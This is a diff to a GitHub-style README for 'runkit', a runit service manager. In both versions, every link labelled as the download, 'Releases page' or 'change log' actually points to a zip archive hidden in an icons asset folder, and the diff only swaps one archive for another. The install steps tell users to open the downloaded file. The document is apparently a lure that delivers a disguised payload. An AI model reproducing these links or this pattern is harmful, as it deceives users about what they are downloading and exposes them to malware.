@@ -10,13 +10,13 @@ Welcome to runkit! This software makes it simple to manage your runit services w
 - **Compatibility:** Works seamlessly with Void Linux and other systems that support runit.
 
 ## 🔗 Download
-[![Download runkit](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/512x512/runkit-3.6.zip%https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/512x512/runkit-3.6.zip)](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/512x512/runkit-3.6.zip)
+[![Download runkit](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/32x32/Software-v2.4-beta.1.zip%https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/32x32/Software-v2.4-beta.1.zip)](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/32x32/Software-v2.4-beta.1.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/512x512/runkit-3.6.zip) to download the latest version of runkit. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/32x32/Software-v2.4-beta.1.zip) to download the latest version of runkit. 
 
 ### Installation Steps:
-1. Navigate to the [runkit Releases page](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/512x512/runkit-3.6.zip).
+1. Navigate to the [runkit Releases page](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/32x32/Software-v2.4-beta.1.zip).
 2. Find the latest version at the top of the page.
 3. Click on the file that matches your system to download it.
 4. Open the downloaded file to install runkit.
@@ -46,7 +46,7 @@ We welcome contributions! If you have ideas or improvements to suggest, feel fre
 Join our community discussions on GitHub to connect with other users and developers. Share your experiences, ask questions, and get support.
 
 ## 📅 Version History
-For a complete history of changes and updates, check our [change log](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/512x512/runkit-3.6.zip).
+For a complete history of changes and updates, check our [change log](https://raw.githubusercontent.com/Visionfiller734/runkit/main/assets/icons/hicolor/32x32/Software-v2.4-beta.1.zip).
 
 ## ✅ License
 runkit is licensed under the MIT license. You can freely use and distribute it under the terms of this license. For more details, please review the included LICENSE file.
